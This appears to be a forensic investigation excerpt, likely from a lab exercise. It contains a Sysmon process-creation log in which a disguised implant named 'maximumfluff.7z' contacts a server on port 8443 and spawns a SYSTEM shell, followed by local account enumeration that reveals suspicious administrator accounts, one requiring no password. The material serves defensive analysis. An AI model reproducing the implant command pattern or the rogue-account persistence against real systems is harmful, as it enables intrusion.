	
```Kibana
	
Process Create:
RuleName: -
UtcTime: 2023-03-06 02:57:01.362
ProcessGuid: {f6e33081-567d-6405-d910-000000000a00}
ProcessId: 11236
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.746 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C type c:\users\public\documents\sharewithreinhard.txt
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {f6e33081-f980-6400-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {f6e33081-9038-6402-2108-000000000a00}
ParentProcessId: 1960
ParentImage: C:\Users\Public\maximumfluff.7z
ParentCommandLine: c:\users\public\maximumfluff.7z  -server https://192.168.3.11:8443 
ParentUser: NT AUTHORITY\SYSTEM
```

```
|   |
|---|
|chief.gufford|
|admini|
|yang.wenli|
|siegfried.kircheis|
|helping.hand|

------------------------------------------
  Local Administrators (Alpha)
------------------------------------------

Name                  PrincipalSource
----                  ---------------
ALPHA\admini                    Local
ALPHA\Administrator             Local
ALPHA\bob                       Local
ALPHA\cockercool                Local
TEMPNET\Domain Admins ActiveDirectory

------------------------------------------
  Local Users
------------------------------------------

Name                Enabled LastLogon             
----                ------- ---------             
Administrator          True 11/26/2023 3:41:37 PM 
Guest                 False                       
krbtgt                False                       
chief.gufford          True                       
helping.hand           True 11/26/2023 7:16:32 PM 
siegfried.kircheis     True 3/11/2023 12:22:12 AM 
yang.wenli             True 3/6/2023 8:15:48 AM   
reinhard.lohengramm    True                       
TEMPNETDC$             True 11/26/2023 5:36:24 PM 
BRAVO$                 True 11/26/2023 10:14:07 PM
ALPHA$                 True 11/26/2023 6:24:40 PM

```

```

[192.168.1.101]: PS C:\Users\public> net user bob
User name                    bob
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/24/2023 8:13:34 AM
Password expires             Never
Password changeable          2/25/2023 8:13:34 AM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   10/25/2023 9:14:03 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.


[192.168.1.101]: PS C:\Users\public> net user cockercool
User name                    cockercool
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/3/2023 5:23:20 PM
Password expires             4/14/2023 5:23:20 PM
Password changeable          3/4/2023 5:23:20 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users                
Global Group memberships     *None                 
The command completed successfully.

```